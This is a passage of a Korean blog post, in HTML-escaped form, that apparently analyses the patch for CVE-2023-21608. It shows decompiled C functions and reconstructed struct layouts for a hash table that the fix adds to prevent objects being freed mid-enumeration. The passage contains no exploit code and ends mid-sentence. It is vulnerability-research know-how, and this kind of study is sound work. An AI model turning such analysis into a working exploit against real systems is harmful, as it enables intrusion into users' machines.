&lt;p&gt;&amp;#xCD94;&amp;#xAC00;&amp;#xB41C; &amp;#xD568;&amp;#xC218;&amp;#xB4E4;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C; &amp;#xACB0;&amp;#xACFC; &amp;#xC5F4;&amp;#xAC70; &amp;#xB3C4;&amp;#xC911;&amp;#xC5D0; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC774; free&amp;#xB418;&amp;#xB294; &amp;#xBC84;&amp;#xADF8;&amp;#xC758; &amp;#xBC1C;&amp;#xC0DD;&amp;#xC744; &amp;#xB9C9;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC5C8;&amp;#xACE0; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD55C; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC740; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;IsDataInGlobalHashTable&#34;&gt;&lt;a href=&#34;#IsDataInGlobalHashTable&#34; class=&#34;headerlink&#34; title=&#34;IsDataInGlobalHashTable&#34;&gt;&lt;/a&gt;IsDataInGlobalHashTable&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;bool&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;IsDataInGlobalHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; Data)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; v1; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a2; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+0h] [ebp-4h] BYREF&lt;/span&gt;

  a2 = v1;
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; Data &amp;amp;&amp;amp; sub_20AD638B(&amp;amp;GlobalHashTable, (ListEntry *)&amp;amp;a2, (&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt;)&amp;amp;Data)-&amp;gt;Flink != GlobalHashTable.DefaultHead;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xB514;&amp;#xCEF4;&amp;#xD30C;&amp;#xC77C;&amp;#xB41C; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC73C;&amp;#xBA70; &lt;code&gt;sub_20AD638B&lt;/code&gt;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC5D0; &lt;code&gt;Data&lt;/code&gt;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xB294;&amp;#xC9C0; &amp;#xD655;&amp;#xC778;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;GlobalHashTable&lt;/code&gt;&amp;#xC740; &amp;#xC790;&amp;#xB8CC;&amp;#xD615;&amp;#xC774; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;HashTable&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC778; &amp;#xC804;&amp;#xC5ED; &amp;#xBCC0;&amp;#xC218;&amp;#xB85C; &amp;#xC5F0;&amp;#xAD00;&amp;#xB41C; &amp;#xBAA8;&amp;#xB4E0; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB4E4;&amp;#xC758; &amp;#xBA85;&amp;#xCE6D;&amp;#xACFC; &amp;#xC815;&amp;#xC758;&amp;#xB294; &amp;#xBD84;&amp;#xC11D;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC720;&amp;#xCD94;&amp;#xD55C; &amp;#xAC83;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;HashTable&#34;&gt;&lt;a href=&#34;#HashTable&#34; class=&#34;headerlink&#34; title=&#34;HashTable&#34;&gt;&lt;/a&gt;HashTable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs basic&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;ListEntry       struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8, mappedto_221)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;Flink           dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;Blink           dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;ListEntry       ends
&lt;span class=&#34;hljs-number&#34;&gt;00000008&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketEntry struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x10, mappedto_223)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;list_entry      union1 ?                
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;Data&lt;/span&gt;            dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-number&#34;&gt;0000000&lt;/span&gt;C field_C         dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000010 &lt;/span&gt;HashBucketEntry ends
&lt;span class=&#34;hljs-number&#34;&gt;00000010&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashTable       struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x30, mappedto_224)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;unknown0        dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;DefaultHead     dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;length          dd ?
&lt;span class=&#34;hljs-number&#34;&gt;0000000&lt;/span&gt;C HashBuckets     HashBucketTable ?       
&lt;span class=&#34;hljs-symbol&#34;&gt;00000020 &lt;/span&gt;field_20        dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000020 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000024 &lt;/span&gt;field_24        dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000028 &lt;/span&gt;field_28        dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000028 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-number&#34;&gt;0000002&lt;/span&gt;C field_2C        dd ?                    
&lt;span class=&#34;hljs-number&#34;&gt;0000002&lt;/span&gt;C                                         
&lt;span class=&#34;hljs-symbol&#34;&gt;00000030 &lt;/span&gt;HashTable       ends
&lt;span class=&#34;hljs-number&#34;&gt;00000030&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketTable struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x14, mappedto_227)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketBegin dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;HashBucketEnd   dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;HashBucketUnknown dd ?                  
&lt;span class=&#34;hljs-number&#34;&gt;0000000&lt;/span&gt;C BucketMaxIndex  dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000010 &lt;/span&gt;BucketCount     dd ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000014 &lt;/span&gt;HashBucketTable ends
&lt;span class=&#34;hljs-number&#34;&gt;00000014&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;HashBucketEntryHeader struc ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8, mappedto_228)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;BucketHead      dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000004 &lt;/span&gt;BucketTail      dd ?                    
&lt;span class=&#34;hljs-symbol&#34;&gt;00000008 &lt;/span&gt;HashBucketEntryHeader ends
&lt;span class=&#34;hljs-number&#34;&gt;00000008&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;; ---------------------------------------------------------------------------
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;union1          union ; (sizeof=&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;x8, mappedto_229)
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;                                        
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;list_entry      ListEntry ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;entry_header    HashBucketEntryHeader ?
&lt;span class=&#34;hljs-symbol&#34;&gt;00000000 &lt;/span&gt;union1          ends
&lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;HashTable&lt;/code&gt;&amp;#xC740; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14; &amp;#xAD6C;&amp;#xD604;&amp;#xC744; &amp;#xC704;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB85C; &lt;code&gt;HashTable.DefaultHead&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &amp;#xC2DC;&amp;#xC791;&amp;#xB418;&amp;#xB294; &amp;#xC6D0;&amp;#xD615; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB85C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC6D0;&amp;#xD615; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB294; &lt;code&gt;HashBucketEntry&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC838; &amp;#xC788;&amp;#xC73C;&amp;#xBA70; &amp;#xC6D0;&amp;#xD615; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC758; &amp;#xC5F0;&amp;#xC18D;&amp;#xC801;&amp;#xC778; &amp;#xC77C;&amp;#xBD80;&amp;#xBD84;&amp;#xC774; &amp;#xAC01;&amp;#xAC01;&amp;#xC758; &amp;#xBC84;&amp;#xD0B7;&amp;#xC774; &amp;#xB418;&amp;#xC5B4; &amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xAD6C;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xD574;&amp;#xC2DC; &amp;#xD14C;&amp;#xC774;&amp;#xBE14;&amp;#xC744; &amp;#xC774;&amp;#xB8E8;&amp;#xB294; &amp;#xBC84;&amp;#xD0B7;&amp;#xB4E4;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xC815;&amp;#xBCF4;&amp;#xB294; &lt;code&gt;HashBucketTable&lt;/code&gt; &amp;#xAD6C;&amp;#xC870;&amp;#xCCB4;&amp;#xC778; &lt;code&gt;HashTable.HashBuckets&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xACE0; &lt;code&gt;HashBucketTable.HashBucketBegin&lt;/code&gt;&amp;#xC774; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xBD80;&amp;#xD130; &lt;code&gt;HashBucketTable.HashBucketEnd&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xC8FC;&amp;#xC18C;&amp;#xAE4C;&amp;#xC9C0; &lt;code&gt;HashBucketTable.BucketCount&lt;/code&gt; &amp;#xAE38;&amp;#xC774;&amp;#xC758; &lt;code&gt;HashBucketEntryHeader&lt;/code&gt; &amp;#xBC30;&amp;#xC5F4;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xB97C; &amp;#xADF8;&amp;#xB9BC;&amp;#xC73C;&amp;#xB85C; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xBA74; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%203.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HashBucketEntryHeader&lt;/code&gt; &amp;#xBC30;&amp;#xC5F4;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC774; &amp;#xC6D0;&amp;#xD615; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC5D0;&amp;#xC11C; &amp;#xD2B9;&amp;#xC815; &amp;#xBC84;&amp;#xD0B7;&amp;#xC5D0; &amp;#xD574;&amp;#xB2F9;&amp;#xD558;&amp;#xB294; &amp;#xC5F0;&amp;#xC18D;&amp;#xB41C; &amp;#xB178;&amp;#xB4DC;&amp;#xB4E4;&amp;#xC744; &amp;#xC774;&amp;#xC911; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xB85C; &amp;#xAD00;&amp;#xB9AC;&amp;#xD558;&amp;#xACE0; &amp;#xC774; &amp;#xC5F0;&amp;#xACB0; &amp;#xB9AC;&amp;#xC2A4;&amp;#xD2B8;&amp;#xC758; Head&amp;#xC640; Tail &amp;#xB178;&amp;#xB4DC;&amp;#xB97C; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xBE44;&amp;#xC5B4;&amp;#xC788;&amp;#xB294; &amp;#xBC84;&amp;#xD0B7;&amp;#xC758; &amp;#xACBD;&amp;#xC6B0;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC640; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC774; &amp;#xBAA8;&amp;#xB450; &lt;code&gt;HashTable.DefaultHead&lt;/code&gt;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%204.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;p&gt;&amp;#xC704;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xB0B4;&amp;#xC6A9;&amp;#xC744; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xC815;&amp;#xB9D0; &amp;#xC624;&amp;#xB79C;&amp;#xB9CC;&amp;#xC5D0; &amp;#xB9AC;&amp;#xBC84;&amp;#xC2F1;&amp;#xC774; &amp;#xC7AC;&amp;#xBBF8;&amp;#xC788;&amp;#xB294; &amp;#xC21C;&amp;#xAC04;&amp;#xC774;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&amp;#xB9CC;&amp;#x2026; &amp;#xC790;&amp;#xC8FC; &amp;#xD558;&amp;#xACE0; &amp;#xC2F6;&amp;#xC9C4; &amp;#xC54A;&amp;#xAD70;&amp;#xC694;&amp;#x2026; &lt;/p&gt;
&lt;p&gt;&amp;#xBB34;&amp;#xD2BC; &amp;#xC774;&amp;#xB7EC;&amp;#xD55C; &amp;#xAD6C;&amp;#xC870;&amp;#xB97C; &amp;#xAC16;&amp;#xB294; &lt;code&gt;HashTable&lt;/code&gt;&amp;#xC744; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xD638;&amp;#xCD9C;&amp;#xB41C; &lt;code&gt;sub_20AD638B&lt;/code&gt;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;sub-20AD638B&#34;&gt;&lt;a href=&#34;#sub-20AD638B&#34; class=&#34;headerlink&#34; title=&#34;sub_20AD638B&#34;&gt;&lt;/a&gt;sub_20AD638B&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;ListEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;sub_20AD638B&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, ListEntry *a2, _DWORD *pData)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  HashBucketEntry *v5; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  ListEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  ListEntry returnPtr; &lt;span class=&#34;hljs-comment&#34;&gt;// [esp+4h] [ebp-8h] BYREF&lt;/span&gt;

  DataHash = hashFunction(&lt;span class=&#34;hljs-number&#34;&gt;0x811C9DC5&lt;/span&gt;, pData, &lt;span class=&#34;hljs-number&#34;&gt;4u&lt;/span&gt;);
  v5 = FindDataFromHashTable(hashTable, &amp;amp;returnPtr, pData, DataHash)-&amp;gt;Blink;
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( !v5 )
    v5 = hashTable-&amp;gt;DefaultHead;
  result = a2;
  a2-&amp;gt;Flink = v5;                              
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xC744; &amp;#xD638;&amp;#xCD9C;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;pData&lt;/code&gt;&amp;#xAC00; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xD574;&amp;#xC2F1;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; __cdecl &lt;span class=&#34;hljs-title&#34;&gt;hashFunction&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; a1, _BYTE *a2, &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; len)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;

  &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; ( i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; len; ++i )
    a1 = &lt;span class=&#34;hljs-number&#34;&gt;0x1000193&lt;/span&gt; * (a1 ^ (&lt;span class=&#34;hljs-keyword&#34;&gt;unsigned&lt;/span&gt; __int8)a2[i]);
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; a1;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;hashFunction&lt;/code&gt;&amp;#xC774; &amp;#xBC18;&amp;#xD658;&amp;#xD55C; &lt;code&gt;DataHash&lt;/code&gt;&amp;#xB97C; &amp;#xC778;&amp;#xC790;&amp;#xB85C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;FindDataFromHashTable&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xB97C; &amp;#xD638;&amp;#xCD9C;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;FindDataFromHashTable&#34;&gt;&lt;a href=&#34;#FindDataFromHashTable&#34; class=&#34;headerlink&#34; title=&#34;FindDataFromHashTable&#34;&gt;&lt;/a&gt;FindDataFromHashTable&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;ListEntry *__thiscall &lt;span class=&#34;hljs-title&#34;&gt;FindDataFromHashTable&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(HashTable *hashTable, ListEntry *returnPtr, _DWORD *pData, &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; DataHash)&lt;/span&gt;&lt;/span&gt;
&lt;span class=&#34;hljs-function&#34;&gt;&lt;/span&gt;{
  &lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; idx; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;
  HashBucketEntryHeader *v5; &lt;span class=&#34;hljs-comment&#34;&gt;// esi&lt;/span&gt;
  HashBucketEntry *v6; &lt;span class=&#34;hljs-comment&#34;&gt;// ecx&lt;/span&gt;
  HashBucketEntry *v7; &lt;span class=&#34;hljs-comment&#34;&gt;// edx&lt;/span&gt;
  ListEntry *result; &lt;span class=&#34;hljs-comment&#34;&gt;// eax&lt;/span&gt;

  idx = DataHash &amp;amp; hashTable-&amp;gt;HashBuckets.BucketMaxIndex;&lt;span class=&#34;hljs-comment&#34;&gt;// Hash &amp;amp; 7&lt;/span&gt;
  v5 = hashTable-&amp;gt;HashBuckets.HashBucketBegin;  
  v6 = hashTable-&amp;gt;DefaultHead;                  &lt;span class=&#34;hljs-comment&#34;&gt;// default header&lt;/span&gt;
  v7 = v5[idx].BucketTail;                     
  &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7 == v6 )                               &lt;span class=&#34;hljs-comment&#34;&gt;// bucket is empty&lt;/span&gt;
  {
    result = returnPtr;
    returnPtr-&amp;gt;Blink = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
LABEL_8:
    result-&amp;gt;Flink = v6;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
  {
    &lt;span class=&#34;hljs-keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; )                                 &lt;span class=&#34;hljs-comment&#34;&gt;// Traverse Bucket(doubly linked list)&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// from Tail to Head&lt;/span&gt;
    {
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( *pData == v7-&amp;gt;Data )                 &lt;span class=&#34;hljs-comment&#34;&gt;// Data Found&lt;/span&gt;
      {
        result = returnPtr;
        v6 = v7-&amp;gt;list_entry.list_entry.Flink;
        returnPtr-&amp;gt;Blink = v7;                  &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Filnk = found-&amp;gt;Flink&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Blink = found&lt;/span&gt;
        &lt;span class=&#34;hljs-keyword&#34;&gt;goto&lt;/span&gt; LABEL_8;
      }
      &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( v7 == v5[idx].BucketHead )
        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
      v7 = v7-&amp;gt;list_entry.list_entry.Blink;
    }
    result = returnPtr;
    returnPtr-&amp;gt;Blink = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
    returnPtr-&amp;gt;Flink = v7;
  }
  &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; result;                                &lt;span class=&#34;hljs-comment&#34;&gt;// Data not found&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// &lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Flink = BucketHead&lt;/span&gt;
                                                &lt;span class=&#34;hljs-comment&#34;&gt;// returnPtr-&amp;gt;Blink = NULL;&lt;/span&gt;
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC774; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &amp;#xBA3C;&amp;#xC800; &lt;code&gt;DataHash&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xD0D0;&amp;#xC0C9;&amp;#xD560; &lt;code&gt;HashBucketEntryHeader&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xC838;&amp;#xC635;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD0D0;&amp;#xC0C9;&amp;#xC740; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xBD80;&amp;#xD130; &lt;code&gt;Blink&lt;/code&gt;&amp;#xB97C; &amp;#xB530;&amp;#xB77C; &lt;code&gt;BucketHead&lt;/code&gt;&amp;#xC5D0; &amp;#xB3C4;&amp;#xB2EC;&amp;#xD560; &amp;#xB54C;&amp;#xAE4C;&amp;#xC9C0; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C0;&amp;#xACE0; &amp;#xB9CC;&amp;#xC57D; &lt;code&gt;BucketTail&lt;/code&gt;&amp;#xC774; &lt;code&gt;DefaultHead&lt;/code&gt;&amp;#xC778; 